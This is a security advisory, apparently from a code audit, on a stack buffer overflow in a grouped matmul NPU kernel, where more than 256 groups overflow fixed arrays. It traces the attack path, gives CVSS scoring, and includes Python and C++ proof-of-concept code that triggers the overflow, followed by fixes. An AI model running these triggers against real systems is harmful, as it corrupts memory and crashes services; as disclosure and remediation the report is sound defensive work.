# VULN-CORE-GEMM-004: Fixed Array Overflow in Grouped Matmul Kernel

## Executive Summary

**Status**: ✅ **CONFIRMED - REAL VULNERABILITY**  
**Severity**: High  
**CWE**: CWE-129 (Improper Validation of Array Index)  
**Component**: `include/catlass/gemm/kernel/grouped_matmul.hpp`

---

## 1. Vulnerability Description

### Overview
The `GroupedMatmul` kernel uses `problemCount` to iterate over fixed-size arrays (`MAX_TENSOR_COUNT=256`) without proper validation. If `problemCount` exceeds `MAX_TENSOR_COUNT`, the `UnpackListParam` function will overflow stack-allocated arrays causing memory corruption.

### Root Cause Analysis

#### 1.1 Fixed Array Declaration (Line 55, 131-134)
```cpp
// grouped_matmul.hpp:55
static constexpr uint32_t MAX_TENSOR_COUNT = 256;

// grouped_matmul.hpp:131-134 (inside operator())
GemmCoord problemShapeList[MAX_TENSOR_COUNT];  // Stack-allocated, fixed size
LayoutA layoutAList[MAX_TENSOR_COUNT];
LayoutB layoutBList[MAX_TENSOR_COUNT];
LayoutC layoutCList[MAX_TENSOR_COUNT];
```

#### 1.2 Unbounded Unpack Operation (Line 137-140)
```cpp
// grouped_matmul.hpp:137-140
detail::UnpackListParam(problemShapeList, params.ptrProblemShape, params.problemCount);
detail::UnpackListParam(layoutAList, params.ptrLayoutA, params.problemCount);
detail::UnpackListParam(layoutBList, params.ptrLayoutB, params.problemCount);
detail::UnpackListParam(layoutCList, params.ptrLayoutC, params.problemCount);
```

#### 1.3 Vulnerable UnpackListParam Implementation (Line 26-31)
```cpp
// grouped_matmul.hpp:26-31
template <class T>
CATLASS_DEVICE
void UnpackListParam(T *const dst, GM_ADDR src, uint32_t len)
{
    // CRITICAL: len controls loop bounds without dst array size validation
    for (uint32_t i = 0; i * sizeof(uint64_t) < len * sizeof(T); ++i) {
        reinterpret_cast<uint64_t *>(dst)[i] = reinterpret_cast<__gm__ uint64_t *>(src)[i];
    }
}
```

When `len > MAX_TENSOR_COUNT`, this loop writes beyond the bounds of the stack-allocated arrays.

#### 1.4 Missing Validation in CanImplement (Line 97-100)
```cpp
// grouped_matmul.hpp:97-100
static bool CanImplement(const Arguments &args)
{
    return true;  // NO VALIDATION - always returns true
}
```

---

## 2. Attack Path Analysis

### Complete Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│  ENTRY POINT: Python Extension API                               │
│  File: examples/python_extension/src/bindings/pybind_bindings.cpp│
│  Line: 25 - grouped_matmul function                              │
│  Trust Level: semi_trusted (user-controllable input)             │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  PYTHON WRAPPER                                                  │
│  File: examples/python_extension/src/wrapper/catlass_kernel_wrapper.cpp│
│  Line: 46-62 - RunGroupedMatmul                                  │
│  Action: Extracts groupList size → kernelInfo.g                  │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  GROUPED_MATMUL WRAPPER                                          │
│  File: examples/python_extension/src/wrapper/grouped_matmul.cpp │
│  Line: 33 - NO VALIDATION                                        │
│  Vulnerable Code:                                                │
│    kernelInfo.g = groupListVec.size();  // Direct user input    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  SHARED LIBRARY IMPLEMENTATION                                   │
│  File: examples/shared_lib/src/kernels/grouped_matmul.cpp       │
│  Line: 38, 76                                                    │
│  Vulnerable Code:                                                │
│    uint32_t problemCount = kernelInfo.g;                         │
│    typename MatmulKernel::Arguments arguments{..., problemCount}│
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  DEVICE GEMM ADAPTER                                             │
│  File: include/catlass/gemm/device/device_gemm.hpp              │
│  Line: 68                                                        │
│  Action: Initialize() → ToUnderlyingArguments                    │
│  Result: params.problemCount = args.problemCount                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  KERNEL EXECUTION (NPU Device)                                   │
│  File: include/catlass/gemm/kernel/grouped_matmul.hpp           │
│  Line: 129-140                                                   │
│  Vulnerable Operation:                                           │
│    1. operator()<AscendC::AIC>(params)                           │
│    2. Stack arrays: problemShapeList[256], etc.                  │
│    3. UnpackListParam(..., params.problemCount)                  │
│    4. OVERFLOW when problemCount > 256                           │
└─────────────────────────────────────────────────────────────────┘
```

### Data Flow Path

```
User Input (groupList tensor size)
    → Python API
    → kernelInfo.g = groupListVec.size()  [NO CHECK]
    → problemCount = kernelInfo.g
    → MatmulKernel::Arguments.problemCount
    → Params.problemCount
    → operator() stack arrays [MAX_TENSOR_COUNT=256]
    → UnpackListParam(..., problemCount)
    → STACK BUFFER OVERFLOW when problemCount > 256
```

---

## 3. Trigger Conditions

### Primary Trigger
| Condition | Requirement |
|-----------|-------------|
| Entry Point | Python extension API or shared library API |
| User Input | `groupList` tensor with size > 256 |
| Execution | NPU kernel execution |

### Exploit Prerequisites
1. Access to Python extension API (`torch_catlass.grouped_matmul`)
2. OR access to shared library API (`CatlassKernel::GroupedMatmul`)
3. Ability to create tensors on NPU device
4. Create `groupList` with > 256 elements

### Normal Usage (From Tests)
```python
# test_python_extension.py:148
g = 128  # Normal value, within bounds
group_list = generate_sequence_split(g, random.randint(256, 4096))
```

The tests use `g=128`, but **no validation prevents `g > 256`**.

---

## 4. Impact Analysis

### Memory Corruption Details

| Array | Type | Size on Stack | Overflow Impact |
|-------|------|---------------|-----------------|
| `problemShapeList` | `GemmCoord[256]` | ~2KB | Overwrites adjacent stack data |
| `layoutAList` | `LayoutA[256]` | Size varies | Overwrites adjacent stack data |
| `layoutBList` | `LayoutB[256]` | Size varies | Overwrites adjacent stack data |
| `layoutCList` | `LayoutC[256]` | Size varies | Overwrites adjacent stack data |

### Potential Consequences
1. **Stack Data Corruption**: Adjacent stack variables corrupted
2. **Program Crash**: Kernel execution failure
3. **Return Address Corruption**: Potential control flow hijacking
4. **NPU Kernel Context Corruption**: Affects device execution state

### Severity Assessment
- **Impact**: High (memory corruption in kernel execution)
- **Exploitability**: Medium-High (direct user control of overflow size)
- **Scope**: NPU kernel execution environment

---

## 5. Exploitability Assessment

### Exploitability: MEDIUM-HIGH

| Factor | Assessment |
|--------|------------|
| Attack Vector | Network/API (Python extension) |
| Attack Complexity | Low (simple parameter manipulation) |
| Privileges Required | None (user-level API) |
| User Interaction | None |
| Scope | Changed (NPU device) |
| CVSS 3.1 Base | 7.5 (High) |

### Exploit Requirements
- **Access**: Python extension API available to users
- **Control**: Direct control over `groupList` size parameter
- **No Mitigation**: No runtime checks on `problemCount`

---

## 6. PoC Construction

### Python Extension PoC
```python
import torch
import torch_catlass
import random

def generate_sequence_split(g, max_size):
    """Generate group sizes for split-m grouped matmul"""
    sizes = []
    remaining = max_size
    for i in range(g - 1):
        size = random.randint(1, remaining // (g - i))
        sizes.append(size)
        remaining -= size
    sizes.append(remaining)
    return sizes

def calculate_prefix_sum(group_list):
    """Calculate prefix sum for group list"""
    result = []
    sum = 0
    for size in group_list:
        sum += size
        result.append(sum)
    return result

# === EXPLOIT: Use > 256 groups ===
g = 300  # EXCEEDS MAX_TENSOR_COUNT=256
group_list = generate_sequence_split(g, 8192)
group_list_prefix_sum = calculate_prefix_sum(group_list)

# Allocate input tensors
m_sum, k, n = group_list_prefix_sum[-1], 256, 256
a = torch.randn((m_sum, k), device="npu").to(torch.float16)
b = torch.randn((g, k, n), device="npu").to(torch.float16)
group_list_tensor = torch.tensor(
    group_list_prefix_sum, device="npu"
).to(torch.int64)

# Trigger stack buffer overflow in NPU kernel
try:
    result = torch_catlass.grouped_matmul(
        a, b, group_list_tensor, "float16", False, True, False
    )
except Exception as e:
    print(f"Kernel crash/error: {e}")  # Expected: memory corruption
```

### Shared Library PoC
```cpp
// Direct API call via shared library
#include "catlass_kernel.h"

void exploit_grouped_matmul() {
    CatlassKernel::KernelInfo kernelInfo;
    kernelInfo.g = 300;  // EXCEEDS MAX_TENSOR_COUNT=256
    kernelInfo.split = CatlassKernel::KernelInfo::GMMSplit::SPLIT_M;
    
    // ... setup input addresses ...
    
    // Trigger overflow
    aclrtStream stream;
    uint32_t blockNum = 20;
    CatlassKernel::GroupedMatmul(blockNum, stream, kernelInfo);
}
```

---

## 7. Affected Code Locations

| File | Lines | Vulnerability |
|------|-------|---------------|
| `include/catlass/gemm/kernel/grouped_matmul.hpp` | 55 | `MAX_TENSOR_COUNT=256` constant |
| `include/catlass/gemm/kernel/grouped_matmul.hpp` | 131-134 | Fixed array declarations |
| `include/catlass/gemm/kernel/grouped_matmul.hpp` | 26-31 | `UnpackListParam` unbounded loop |
| `include/catlass/gemm/kernel/grouped_matmul.hpp` | 137-140 | Unbounded unpack calls |
| `include/catlass/gemm/kernel/grouped_matmul.hpp` | 97-100 | Missing `CanImplement` validation |
| `examples/python_extension/src/wrapper/grouped_matmul.cpp` | 33 | No validation of `groupListVec.size()` |

---

## 8. Recommended Mitigations

### 8.1 Add Validation in CanImplement
```cpp
// grouped_matmul.hpp:97-100
static bool CanImplement(const Arguments &args)
{
    if (args.problemCount > MAX_TENSOR_COUNT) {
        return false;
    }
    return true;
}
```

### 8.2 Add Validation in Python Wrapper
```cpp
// grouped_matmul.cpp:33
kernelInfo.g = groupListVec.size();
if (kernelInfo.g > 256) {
    throw std::runtime_error("groupList size exceeds maximum (256)");
}
```

### 8.3 Add Runtime Check in Kernel
```cpp
// grouped_matmul.hpp:operator()
if (params.problemCount > MAX_TENSOR_COUNT) {
    // Handle error: either clamp or return error
    return;
}
```

### 8.4 Use Dynamic Allocation (Alternative)
```cpp
// Instead of fixed arrays, use dynamic allocation
std::vector<GemmCoord> problemShapeList(params.problemCount);
// Or allocate from workspace
```

---

## 9. Related Vulnerabilities

The same pattern exists in `group_gemm.hpp`:
```cpp
// group_gemm.hpp:199
static constexpr uint32_t MAX_TENSOR_COUNT = 32;  // Different limit!
// Similar vulnerable pattern with fixed arrays
```

This suggests a systemic issue across the codebase.

---

## 10. Verification Status

| Check | Status | Evidence |
|-------|--------|----------|
| Fixed arrays exist | ✅ Confirmed | Lines 131-134 |
| User controls problemCount | ✅ Confirmed | Python wrapper line 33 |
| No validation | ✅ Confirmed | CanImplement returns true |
| Overflow possible | ✅ Confirmed | UnpackListParam loop |
| Entry point reachable | ✅ Confirmed | Python API documented |

---

## Conclusion

This is a **confirmed real vulnerability** with:
- Clear root cause (missing boundary validation)
- Exploitable attack path (user-controlled parameter)
- High severity impact (stack buffer overflow in NPU kernel)
- No existing mitigations

**Recommendation**: Apply validation checks at all entry points before kernel execution.
